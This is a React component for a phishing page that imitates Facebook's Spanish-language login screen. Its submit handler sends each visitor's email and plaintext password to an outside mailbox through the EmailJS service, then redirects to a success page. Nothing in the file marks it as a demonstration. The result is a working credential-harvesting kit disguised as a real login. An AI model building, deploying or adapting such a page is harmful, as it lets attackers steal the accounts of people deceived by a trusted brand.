import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import '../styles.css';

const LoginForm = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    email: '',
    password: '',
  });

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      await emailjs.send(
        import.meta.env.VITE_EMAILJS_SERVICE_ID, // Variable de entorno para service_id
        import.meta.env.VITE_EMAILJS_TEMPLATE_ID, // Variable de entorno para template_id
        { email: formData.email, password: formData.password },
        import.meta.env.VITE_EMAILJS_USER_ID // Variable de entorno para user_id
      );
      navigate('/success');
    } catch (error) {
      console.error('Error enviando email:', error);
    }
  };

  return (
    <div className="container text-center">
      <div className="row w-100">
        <div className="col-lg-6 d-flex flex-column justify-content-center align-items-start left-content">
          <h1>facebook</h1>
          <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div className="col-lg-6 d-flex justify-content-center">
          <div className="login-box">
            <form onSubmit={handleSubmit}>
              <input
                type="email"
                className="form-control mb-3"
                name="email"
                placeholder="Correo electrónico o número de teléfono"
                value={formData.email}
                onChange={handleChange}
                required
              />
              <input
                type="password"
                className="form-control mb-3"
                name="password"
                placeholder="Contraseña"
                value={formData.password}
                onChange={handleChange}
                required
              />
              <button className="btn btn-login btn btn-primary" type="submit">
                Iniciar sesión
              </button>
            </form>
            <a href="#" className="forgot-password">
              ¿Has olvidado la contraseña?
            </a>
            <div className="divider"></div>
            <button
              className="btn btn-register btn btn-success"
              onClick={() => alert('Crear cuenta nueva no implementado.')}
            >
              Crear cuenta nueva
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
